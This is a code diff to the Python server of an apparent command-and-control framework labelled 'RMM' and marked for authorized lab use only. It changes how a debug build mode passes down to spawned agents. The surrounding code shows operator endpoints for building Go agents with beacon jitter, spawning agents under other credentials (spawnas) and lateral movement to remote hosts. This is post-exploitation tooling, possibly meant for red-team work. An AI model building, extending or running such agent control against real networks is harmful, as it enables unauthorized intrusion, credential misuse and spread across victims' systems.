@@ -612,8 +612,8 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
       Returns the full Go agent binary directly in the ZIP (current behaviour).
 
     Debug build (debug=True, requires stageless=True):
-      Compiles the rmmdebug implementation into a separately named companion.
-      The supplied launcher enables diagnostics; normal builds omit that code.
+      Compiles the rmmdebug implementation into a separately named main agent.
+      Diagnostics follow the compiled build for this agent and its descendants.
     """
     goos = str(goos or "").strip().lower()
     goarch = str(goarch or "").strip().lower()
@@ -930,8 +930,6 @@ Authorized lab use only.
         "RMM_JITTER_PERCENT": str(jitter_percent),
         "RMM_HTTP_PROXY": config_values["http_proxy"],
     }
-    if debug:
-        configured["RMM_DEBUG"] = "1"
     if goos == "windows":
         launcher_config = "".join(
             f"$env:{name} = '{value.replace(chr(39), chr(39) * 2)}'\n"
@@ -993,8 +991,8 @@ Workspace binding: RMM_AGENT_WORKSPACE_ID (embedded in configured builds).
 Authorized lab use only.
 """
     if debug:
-        readme += "\nDebug build: run-agent.ps1 enables local diagnostics with RMM_DEBUG=1.\n"
-        readme += "Copy the debug executable beside the normal agent to use spawnas -d.\n"
+        readme += "\nDebug build: diagnostics are compiled in and inherited by spawned agents.\n"
+        readme += "Deploy this executable as the main agent; no runtime debug switch is used.\n"
     with zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
         archive.write(binary_path, arcname=binary_filename)
         archive.writestr(launcher_name, launcher)
@@ -1088,6 +1086,7 @@ class Session:
         self.work_dir = None
         self.os_type = "windows"
         self.agent_type = "powershell"
+        self.agent_debug = False
         self.agent_pid = None
         self.agent_process_name = None
         self.capabilities = []
@@ -1136,6 +1135,7 @@ class Session:
             "work_dir": self.work_dir,
             "os_type": self.os_type,
             "agent_type": self.agent_type,
+            "agent_debug": self.agent_debug,
             "agent_pid": self.agent_pid,
             "agent_process_name": self.agent_process_name,
             "capabilities": list(self.capabilities),
@@ -1711,6 +1711,8 @@ class RMMServer:
         if valid_workspace_id(workspace_id):
             session.workspace_id = workspace_id
         session.config_synced = True
+        session.agent_type = str(rec.get("agent_type") or "powershell").strip().lower()
+        session.agent_debug = session.agent_type == "go" and rec.get("agent_debug") is True
         session.agent_process_name = normalize_agent_process_name(rec.get("agent_process_name"))
         pid = rec.get("agent_pid")
         if type(pid) is int and 0 < pid <= 0xFFFFFFFF:
@@ -3099,17 +3101,17 @@ class RMMServer:
         return payload, "ok"
 
     def spawn_session(self, session_id_or_prefix, verify=True, spawn_timeout=120.0,
-                      register_timeout=60.0, verify_timeout=120.0, debug=False):
-        """Request a detached Go agent and prove its expected registration."""
+                      register_timeout=60.0, verify_timeout=120.0):
+        """Request a detached Go agent; debug sources pass their build mode to descendants."""
         session = self.resolve_session(session_id_or_prefix)
         if not session:
             return None, "not_found"
         if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
             return None, "agent_type_unsupported"
+        debug = getattr(session, "agent_debug", False) is True
         spawned_id = self._new_deployment_id("spawn")
         command = SPAWN_COMMAND + "\n" + json.dumps({
-            "session_id": spawned_id, "workspace_id": getattr(session, "workspace_id", None) or "",
-            "debug": debug}, separators=(",", ":"))
+            "session_id": spawned_id, "workspace_id": getattr(session, "workspace_id", None) or ""}, separators=(",", ":"))
         self.record_operator_action(session, SPAWN_COMMAND, "spawn")
         event, status = self.exec_and_wait(session.id, command, timeout=spawn_timeout)
         if status not in ("ok", "timeout"):
@@ -3118,6 +3120,7 @@ class RMMServer:
         match = SPAWN_RESULT_RE.search(output)
         acknowledged = bool(match and match.group("session_id") == spawned_id)
         payload = {"parent_session_id": session.id, "spawned_session_id": spawned_id,
+                   "debug": debug,
                    "spawn_pid": int(match.group("pid")) if acknowledged else None,
                    "spawn_output": output, "launch_status": "acknowledged" if acknowledged else "inconclusive",
                    "submission_status": status}
@@ -3229,9 +3232,8 @@ class RMMServer:
                 "session_id": session.id, "output": body}, "ok"
 
     def spawnas(self, session_id_or_prefix, workspace_dir, domain, user, password,
-                verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0,
-                debug=False):
-        """Spawn under a different identity, with optional local debug diagnostics.
+                verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0):
+        """Spawn under a different identity, inheriting a debug source build.
 
         Credentials are resolved server-side; only the identity label travels in
         operator events, never the password.
@@ -3241,6 +3243,7 @@ class RMMServer:
             return None, "not_found"
         if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
             return None, "agent_type_unsupported"
+        debug = getattr(session, "agent_debug", False) is True
         user = (user or "").strip()
         domain = (domain or "").strip()
         if domain == "" and "\\" in user:
@@ -3252,7 +3255,7 @@ class RMMServer:
         command = SPAWNAS_COMMAND + "\n" + json.dumps(
             {"session_id": spawned_id,
              "workspace_id": getattr(session, "workspace_id", None) or "",
-             "domain": domain, "user": user, "password": password or "", "debug": debug},
+             "domain": domain, "user": user, "password": password or ""},
             separators=(",", ":"),
         )
         self.record_operator_action(session, f"{SPAWNAS_COMMAND} {identity}", "spawnas")
@@ -3264,6 +3267,7 @@ class RMMServer:
         acknowledged = bool(match and match.group("session_id") == spawned_id)
         payload = {
             "parent_session_id": session.id,
+            "debug": debug,
             "spawned_session_id": spawned_id,
             "identity": identity,
             "spawn_pid": int(match.group("pid")) if acknowledged else None,
@@ -3306,13 +3310,14 @@ class RMMServer:
         return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
-                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, debug=False):
-        """Request remote execution; only the expected new agent proves deployment."""
+                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0):
+        """Request remote execution using the source agent's compiled debug mode."""
         session = self.resolve_session(session_id_or_prefix)
         if not session:
             return None, "not_found"
         if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
             return None, "agent_type_unsupported"
+        debug = getattr(session, "agent_debug", False) is True
         method = (method or "").strip().lower()
         host = (host or "").strip().strip("\\")
         if method not in LATERAL_METHODS:
@@ -3343,7 +3348,7 @@ class RMMServer:
         command = LATERAL_COMMAND + "\n" + json.dumps({
             "method": method, "host": host, "timeout_seconds": worker_timeout,
             "session_id": target_id, "workspace_id": getattr(session, "workspace_id", None) or "",
-            "stage": stage_id, "debug": debug}, separators=(",", ":"))
+            "stage": stage_id}, separators=(",", ":"))
         self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}", "lateral")
         event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
         if status not in ("ok", "timeout"):
@@ -3355,6 +3360,7 @@ class RMMServer:
         service_match = LATERAL_SERVICE_RE.search(output)
         binary_match = LATERAL_BINARY_RE.search(output)
         payload = {"session_id": session.id, "method": method, "host": host,
+                   "debug": debug,
                    "target_session_id": target_id, "output": output,
                    "launch_status": "acknowledged" if acknowledged else "failed" if failed else "inconclusive", "submission_status": status}
         payload, verify_status = self._verify_deployment(session, target_id, payload, verify, register_timeout)
@@ -3503,7 +3509,9 @@ class RMMServer:
         workspace_id="",
         agent_pid=None,
         agent_process_name=None,
+        agent_debug=False,
     ):
+        agent_debug = (agent_type or "powershell").strip().lower() == "go" and agent_debug is True
         agent_process_name = normalize_agent_process_name(agent_process_name)
         pid_text = str(agent_pid)
         agent_pid = int(pid_text) if re.fullmatch(r"[0-9]{1,10}", pid_text) else None
@@ -3528,6 +3536,7 @@ class RMMServer:
             if session_id not in self.sessions:
                 session = Session(session_id, hostname, username, ip)
                 session.agent_type = (agent_type or "powershell").strip().lower()
+                session.agent_debug = agent_debug
                 session.agent_pid = agent_pid
                 session.agent_process_name = agent_process_name
                 session.capabilities = sorted(set(capabilities or []))
@@ -3558,8 +3567,10 @@ class RMMServer:
                 s = self.sessions[session_id]
                 pid_changed = s.agent_pid != agent_pid
                 process_changed = s.agent_process_name != agent_process_name
+                debug_changed = s.agent_debug != agent_debug
                 s.agent_pid = agent_pid
                 s.agent_process_name = agent_process_name
+                s.agent_debug = agent_debug
                 binding_changed = bool(workspace_id and not s.workspace_id)
                 if binding_changed:
                     s.workspace_id = workspace_id
@@ -3578,7 +3589,7 @@ class RMMServer:
                     s.config_synced = True
                     to_save = s
                 else:
-                    to_save = s if binding_changed or pid_changed or process_changed else None
+                    to_save = s if binding_changed or pid_changed or process_changed or debug_changed else None
         if is_new and to_save is not None:
             self.backfill_download_artifacts(to_save)
             self._apply_history_meta_to_session(to_save)
@@ -5274,20 +5285,21 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "spawn":
+            if "debug" in body:
+                self._json(400, {"error": "debug_is_build_time_only",
+                                 "detail": "Select debug when building the agent, not per deployment."})
+                return True
             session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
             try:
                 verify = body.get("verify", True)
-                debug = body.get("debug", False)
                 spawn_timeout = float(body.get("spawn_timeout", 120))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
-                if not isinstance(debug, bool):
-                    raise ValueError("debug must be a boolean")
                 if not all(1 <= value <= 3600
                            for value in (spawn_timeout, register_timeout, verify_timeout)):
                     raise ValueError("spawn timeouts must be between 1 and 3600 seconds")
@@ -5300,7 +5312,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 spawn_timeout=spawn_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
-                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -5397,6 +5408,10 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "spawnas":
+            if "debug" in body:
+                self._json(400, {"error": "debug_is_build_time_only",
+                                 "detail": "Select debug when building the agent, not per deployment."})
+                return True
             session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
@@ -5408,14 +5423,11 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             try:
                 verify = body.get("verify", True)
-                debug = body.get("debug", False)
                 spawn_timeout = float(body.get("spawn_timeout", 120))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
-                if not isinstance(debug, bool):
-                    raise ValueError("debug must be a boolean")
                 if not all(1 <= v <= 3600 for v in (spawn_timeout, register_timeout, verify_timeout)):
                     raise ValueError("spawnas timeouts must be between 1 and 3600 seconds")
             except (TypeError, ValueError):
@@ -5446,7 +5458,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 spawn_timeout=spawn_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
-                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -5534,20 +5545,21 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "lateral":
+            if "debug" in body:
+                self._json(400, {"error": "debug_is_build_time_only",
+                                 "detail": "Select debug when building the agent, not per deployment."})
+                return True
             session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
             try:
                 verify = body.get("verify", True)
-                debug = body.get("debug", False)
                 exec_timeout = float(body.get("exec_timeout", 300))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
-                if not isinstance(debug, bool):
-                    raise ValueError("debug must be a boolean")
                 if not all(1 <= value <= 3600
                            for value in (exec_timeout, register_timeout, verify_timeout)):
                     raise ValueError("lateral timeouts must be between 1 and 3600 seconds")
@@ -5562,7 +5574,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout=exec_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
-                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -6307,6 +6318,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     workspace_id=qs.get("workspace_id", [""])[0],
                     agent_pid=qs.get("pid", [None])[0],
                     agent_process_name=qs.get("process_name", [None])[0],
+                    agent_debug=qs.get("debug_build", []) == ["true"],
                 )
             except ValueError:
                 self._respond(403, "AGENT WORKSPACE REJECTED")
